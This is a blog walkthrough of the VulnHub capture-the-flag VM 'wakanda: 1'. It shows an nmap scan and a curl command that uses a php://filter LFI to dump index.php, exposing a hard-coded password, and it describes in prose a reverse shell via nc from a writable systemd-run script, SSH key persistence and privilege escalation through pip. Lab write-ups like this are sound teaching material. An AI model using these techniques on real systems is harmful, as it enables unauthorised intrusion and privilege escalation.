@@ -1,0 +1,199 @@
+
+
+Wakanda Forever
+
+
+
+
+
+
+
+
+Bernie Lim
+
+
+
+
+A security enthusiast. Likes cats.
+
+
+
+
+
+29 Aug 2018
+
+
+
+6 min read
+
+
+0 Comments
+
+
+
+
+
+This post documents the complete walkthrough of wakanda: 1, a boot2root VM created by @xMagass, and hosted at VulnHub. If you are uncomfortable with spoilers, please stop reading now.
+
+Background
+A new Vibranium market will soon be online in the dark net. Your goal, get your hands on the root file containing the exact location of the mine.
+Information Gathering
+Letâs start with a nmap scan to establish the available services in the host.
+# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.129
+...
+PORT      STATE SERVICE REASON         VERSION
+80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Vibranium Market
+111/tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          57594/tcp  status
+|_  100024  1          58513/udp  status
+3333/tcp  open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
+| ssh-hostkey:
+|   1024 1c:98:47:56:fc:b8:14:08:8f:93:ca:36:44:7f:ea:7a (DSA)
+|   2048 f1:d5:04:78:d3:3a:9b:dc:13:df:0f:5f:7f:fb:f4:26 (RSA)
+|   256 d8:34:41:5d:9b:fe:51:bc:c6:4e:02:14:5e:e1:08:c5 (ECDSA)
+|_  256 0e:f5:8d:29:3c:73:57:c7:38:08:6d:50:84:b6:6c:27 (ED25519)
+57594/tcp open  status  syn-ack ttl 64 1 (RPC #100024)
+
+nmap finds 80/tcp, 111/tcp and 3333/tcp open. Nothing stands out, except for SSH running at 3333/tcp.
+Letâs check out the âVibranium Marketâ home page.
+
+Local File Inclusion (LFI)
+Letâs check the HTML source as well while we are at it.
+
+The commented HTML seems to suggest LFI vulnerability is present with the lang parameter.
+
+Hmm. The message changes to French.
+# curl -I 192.168.30.129/fr.php
+HTTP/1.1 200 OK
+Date: Tue, 28 Aug 2018 16:38:35 GMT
+Server: Apache/2.4.10 (Debian)
+Content-Type: text/html; charset=UTF-8
+
+The file fr.php is also present.
+Iâm guessing thereâs PHP code in index.php like this.
+include( $_GET['lang']) . ".php" );
+
+If thatâs the case, we can make use of PHP filter wrapper to peek at index.php in base64 encoding.
+
+Indeed, letâs clean it up with some Linux-fu.
+# curl -s http://192.168.30.129/index.php?lang=php://filter/convert.base64-encode/resource=index | head -1 | base64 -d | sed -r '/^$/d'
+
+Hereâs the output.
+&lt;?php
+$password ="Niamey4Ever227!!!" ;//I have to remember it
+if (isset($_GET['lang']))
+{
+include($_GET['lang'].".php");
+}
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;&lt;head&gt;
+&lt;meta http-equiv="content-type" content="text/html; charset=UTF-8"&gt;
+    &lt;meta charset="utf-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"&gt;
+    &lt;meta name="description" content="Vibranium market"&gt;
+    &lt;meta name="author" content="mamadou"&gt;
+    &lt;title&gt;Vibranium Market&lt;/title&gt;
+    &lt;link href="bootstrap.css" rel="stylesheet"&gt;
+
+    &lt;link href="cover.css" rel="stylesheet"&gt;
+  &lt;/head&gt;
+  &lt;body class="text-center"&gt;
+    &lt;div class="cover-container d-flex w-100 h-100 p-3 mx-auto flex-column"&gt;
+      &lt;header class="masthead mb-auto"&gt;
+        &lt;div class="inner"&gt;
+          &lt;h3 class="masthead-brand"&gt;Vibranium Market&lt;/h3&gt;
+          &lt;nav class="nav nav-masthead justify-content-center"&gt;
+            &lt;a class="nav-link active" href="#"&gt;Home&lt;/a&gt;
+            &lt;!-- &lt;a class="nav-link active" href="?lang=fr"&gt;Fr/a&gt; --&gt;
+          &lt;/nav&gt;
+        &lt;/div&gt;
+      &lt;/header&gt;
+      &lt;main role="main" class="inner cover"&gt;
+        &lt;h1 class="cover-heading"&gt;Coming soon&lt;/h1&gt;
+        &lt;p class="lead"&gt;
+          &lt;?php
+            if (isset($_GET['lang']))
+          {
+          echo $message;
+          }
+          else
+          {
+            ?&gt;
+            Next opening of the largest vibranium market. The products come directly from the wakanda. stay tuned!
+            &lt;?php
+          }
+?&gt;
+        &lt;/p&gt;
+        &lt;p class="lead"&gt;
+          &lt;a href="#" class="btn btn-lg btn-secondary"&gt;Learn more&lt;/a&gt;
+        &lt;/p&gt;
+      &lt;/main&gt;
+      &lt;footer class="mastfoot mt-auto"&gt;
+        &lt;div class="inner"&gt;
+          &lt;p&gt;Made by&lt;a href="#"&gt;@mamadou&lt;/a&gt;&lt;/p&gt;
+        &lt;/div&gt;
+      &lt;/footer&gt;
+    &lt;/div&gt;
+
+&lt;/body&gt;&lt;/html&gt;
+
+The password Niamey4Ever227!!! at the top is most probably mamadouâs password.
+Low-Privilege Shell
+Letâs give it a shot.
+
+Who uses a Python interpreter as shell? Honestly! No big dealâwe can give ourselves a shell like so.
+
+DevOps Trickery in systemd
+
+During enumeration of mamadouâs account, I found the following:
+
+A Python file /srv/.antivirus.py containing a one-liner
+A systemd serviceâAntivirus that executes the above with devopsâs account
+
+Hereâs how /srv/.antivirus.py looks like.
+
+The important thing about /srv/.antivirus.py is that anyone can edit it.
+
+Hereâs how /lib/systemd/system/antivirus.service looks like.
+
+systemd will attempt to restart the service every 300 seconds in the event it fails.
+If we change /src/.antivirus.py to something like this, we get a reverse shell via nc (which is available in the VM by the way) with devopsâs privileges 300 seconds later.
+
+While we wait for our reverse shell, the first flag is at mamadouâs home directory.
+
+In the meantime, I think I found the ticket to privilege escalation.
+
+300 seconds have passed, and I got myself a reverse shell.
+
+Since SSH is available, letâs put in the SSH public key we control to /home/devops/.ssh/authorized_keys and log in through SSH. This way, we get a far superior shell.
+Generate the keypair with ssh-keygen at the attacking machine.
+
+Create the /home/devops/.ssh directory and copy the public key over at the less superior shell. 
+
+Now, log in to devopsâs account with the private key.
+
+Before we move on, hereâs the second flag.
+
+Privilege Escalation
+We know pip is for installing Python packages. Does that mean that we have to write our own privilege escalation package?
+
+Letâs do something like this.
+
+On the nc listener, a root shell returns.
+
+Whatâs the Flag (WTF)
+After repeating the SSH trick for root, getting the flag is trivial.
+
+
+Afterthought
+But whereâs the Vibranium?
+
